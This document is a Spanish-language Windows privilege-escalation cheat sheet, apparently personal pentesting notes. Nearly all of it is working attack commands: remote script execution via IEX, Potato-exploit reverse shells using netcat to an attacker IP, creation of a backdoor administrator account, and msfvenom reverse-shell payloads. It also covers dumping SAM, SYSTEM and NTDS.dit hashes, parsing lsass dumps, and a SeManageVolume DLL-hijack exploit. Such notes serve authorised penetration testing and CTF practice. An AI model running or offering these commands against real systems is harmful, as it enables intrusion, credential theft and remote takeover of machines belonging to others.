---
layout: default
title: Windows
---

```bash
whoami /all
```

```powershell
IEX(New-Object Net.WebClient).downloadString('http://IP:PORT/winPEAS.ps1')
```

Credenciales en caché
```bash
cmdkey /list
```
**\[+\]Dumpear DPAPI creds**

```
tasklist
```
# Puertos en escucha

```bash
netstat -ano | FindStr /I "LISTENING"
```

Que usuario ejecuta ese puerto
```bash
tasklist /FI "PID eq 5540" /V
```
Si tira permission denied, probablemente sea SYSTEM o Administrator
___

```
C:\inetpub
```

```
C:\xampp\htdocs
```

Ver permisos sobre una carpeta:
```
icacls htdocs
```

- `(F)` → _Full control_: control total (leer, escribir, ejecutar, cambiar permisos, eliminar).
    
- `(RX)` → _Read & Execute_: leer + ejecutar archivos.
    
- `(AD)` → _Append Data_: añadir datos a un archivo o crear subcarpetas en una carpeta.
    
- `(WD)` → _Write Data_: escribir en archivos ya existentes o crear archivos nuevos.

LibreOffice
```cmd
C:\Program Files\LibreOffice\program> type version.ini
```
[CVE-2023-2255](https://nvd.nist.gov/vuln/detail/CVE-2023-2255)

Leer Historial
```powershell
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
```

```cmd
type C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
# **SeImpersonatePrivilege**

[GitHub - BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
```bash
.\gp.exe -cmd "nc64.exe -e cmd.exe IP ATACANTE PUERTO"
```
O crear un nuevo usuario admin

```bash
net user m0b Password123! /add
net localgroup Administrators m0b /add
net localgroup "Remote Management Users" m0b /add
```

Si no va así probaremos con  **JuicyPotato** (versión de 32 o 64 bits):

```powershell
powershell -c Invoke-WebRequest -Uri "http://IP:PORT/nc.exe" -OutFile nc.exe
powershell -c Invoke-WebRequest -Uri "http://IP:PORT/JuicyPotato.exe" -OutFile JuicyPotato.exe
powershell -c Invoke-WebRequest -Uri "http://IP:PORT/rshell.bat" -OutFile rshell.bat
```

`rshell.bat`

```bash
C:\Users\kohsuke\AppData\Local\Temp\pentesting\nc.exe -e powershell.exe IP PORT
```

```bash
sudo rlwrap -cAr nc -lvnp PORT
```

```bash
./jp.exe -p ./rshell.bat -l 3333 -t * -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}"
```

Usar otro CLSID según versión de Windows

[juicy-potato/CLSID at master · ohpe/juicy-potato · GitHub](https://github.com/ohpe/juicy-potato/tree/master/CLSID)

Probar con shell de msfvenom (32 o 64 bits)
```BAsh
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o revShell.exe
```


**PowerUp**
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
upload /ruta .
Import-Module .\PowerUp.ps1
. .\PowerUp.ps1

||

IEX (New-Object Net.WebClient).DownloadString('http://IP:PORT/PowerUp.ps1')

Invoke-AllChecks
```

**Abrir archivo lsass.DMP**

```bash
pip install pypykatz
pypykatz lsa minidump lsass.dmp
```

# **SeBackup/SeRestore Privilege**

- Para sacar **credenciales locales** (Se puede hacer PtH y crackings)

```cmd
reg save hklm\system C:\Users\svc_backup\AppData\Local\Temp\pentest\system.hive
reg save hklm\sam C:\Users\svc_backup\AppData\Local\Temp\pentest\sam.hive
```

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

- Para sacar las **credenciales de un DC**

[Windows Privilege Escalation: SeBackupPrivilege - Hacking Articles](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)

`raj.dsh`
```
set context persistent nowriters
add volume c: alias raj
create
expose %raj% z:
```

```bash
unix2dos raj.dsh
```

```bash
upload raj.dsh
```

```bash
cd $env:TEMP
upload raj.dsh
diskshadow /s raj.dsh
robocopy /b z:\windows\ntds . ntds.dit
```

```bash
impacket-secretsdump -ntds ntds.dit -system system local
```

# **SeManageVolume Privilege**

```bash
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
```

```
.\SeManageVolumeExploit.exe
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll -o tzres.dll
```

```bash
cd C:\Windows\system32\wbem
```

```bash
certutil.exe -urlcache -split -f http://IP/tzres.dll
```

```bash
rlwrap -cAr nc -lvnp PORT
```

```
systeminfo
```

